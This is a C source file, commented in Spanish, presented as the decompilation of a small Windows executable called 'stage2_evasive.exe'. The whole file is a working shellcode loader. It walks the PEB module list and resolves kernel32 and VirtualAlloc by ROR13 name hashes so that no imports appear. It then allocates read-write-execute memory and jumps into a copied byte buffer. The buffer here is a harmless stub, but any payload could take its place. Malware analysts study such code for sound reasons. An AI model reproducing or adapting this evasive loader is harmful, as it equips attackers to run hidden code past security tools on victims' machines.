/**
 * Archivo decompilado a partir de: stage2_evasive.exe (PE32+ x86-64, 4096 bytes)
 * Compilador detectado en .rdata: GCC: (GNU) 16-win32 (MinGW-w64)
 *
 * Mapa de funciones en la sección .text (ImageBase = 0x140000000):
 *   - 0x140001000 .. 0x140001041 : HashStringROR13(const char* str)
 *   - 0x140001042 .. 0x1400010d4 : HashWStringROR13(const wchar_t* str, USHORT byteLen)
 *   - 0x1400010d5 .. 0x1400011b3 : GetModuleByHash(DWORD targetHash)
 *   - 0x1400011b4 .. 0x1400012f9 : GetProcAddressByHash(HMODULE hModule, DWORD targetHash)
 *   - 0x1400012fa .. 0x1400013c5 : ExecuteStage1(void)
 *   - 0x1400013c6 .. 0x1400013d9 : WinMainCRTStartup(void) [AddressOfEntryPoint = 0x13c6]
 */

#include <windows.h>
#include <winternl.h>

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;           // +0x00
    LIST_ENTRY InMemoryOrderLinks;         // +0x10
    LIST_ENTRY InInitializationOrderLinks; // +0x20
    PVOID DllBase;                         // +0x30
    PVOID EntryPoint;                      // +0x38
    ULONG SizeOfImage;                     // +0x40
    UNICODE_STRING FullDllName;            // +0x48
    UNICODE_STRING BaseDllName;            // +0x58 (Length en +0x58, Buffer en +0x60)
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

#define HASH_KERNEL32_DLL  0x8FECD63F
#define HASH_VIRTUALALLOC  0x91AFCA54

typedef LPVOID (WINAPI *fnVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

// 0x140001000
DWORD HashStringROR13(const char* str) {
    DWORD hash = 0;
    while (*str != '\0') {
        hash = (hash >> 13) | (hash << 19);
        hash += (DWORD)(unsigned char)(*str++);
    }
    return hash;
}

// 0x140001042
DWORD HashWStringROR13(const wchar_t* str, USHORT byteLen) {
    DWORD hash = 0;
    USHORT count = byteLen / sizeof(wchar_t);

    for (USHORT i = 0; i < count && str[i] != L'\0'; i++) {
        wchar_t c = str[i];
        if (c >= L'A' && c <= L'Z') {
            c += (L'a' - L'A');
        }
        hash = (hash >> 13) | (hash << 19);
        hash += (DWORD)c;
    }
    return hash;
}

// 0x1400010d5
HMODULE GetModuleByHash(DWORD targetHash) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr) {
        return NULL;
    }

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pHeader = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pCurrent = pHeader->Flink;

    while (pCurrent != pHeader) {
        PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(
            pCurrent,
            LDR_DATA_TABLE_ENTRY_FULL,
            InMemoryOrderLinks
        );

        if (pEntry->BaseDllName.Buffer != NULL && pEntry->BaseDllName.Length > 0) {
            DWORD hash = HashWStringROR13(
                pEntry->BaseDllName.Buffer,
                pEntry->BaseDllName.Length
            );
            if (hash == targetHash) {
                return (HMODULE)pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

// 0x1400011b4
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD targetHash) {
    if (!hModule) {
        return NULL;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRva) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + exportRva);
    PDWORD pFunctions = (PDWORD)((PBYTE)hModule + pExport->AddressOfFunctions);
    PDWORD pNames     = (PDWORD)((PBYTE)hModule + pExport->AddressOfNames);
    PWORD  pOrdinals  = (PWORD)((PBYTE)hModule + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* funcName = (const char*)((PBYTE)hModule + pNames[i]);
        if (HashStringROR13(funcName) == targetHash) {
            WORD ordinal = pOrdinals[i];
            return (FARPROC)((PBYTE)hModule + pFunctions[ordinal]);
        }
    }
    return NULL;
}

// 0x1400012fa
int ExecuteStage1(void) {
    HMODULE hKernel32 = GetModuleByHash(HASH_KERNEL32_DLL);
    if (!hKernel32) {
        return 1;
    }

    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddressByHash(hKernel32, HASH_VIRTUALALLOC);
    if (!pVirtualAlloc) {
        return 2;
    }

    LPVOID pMem = pVirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMem) {
        return 3;
    }

    unsigned char shellcode[] = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret

    PBYTE dst = (PBYTE)pMem;
    for (SIZE_T i = 0; i < sizeof(shellcode); i++) {
        dst[i] = shellcode[i];
    }

    typedef int (*fnPayload)(void);
    fnPayload run = (fnPayload)pMem;
    return run();
}

// 0x1400013c6 (Entry Point)
__attribute__((force_align_arg_pointer))
void WinMainCRTStartup(void) {
    ExecuteStage1();
}
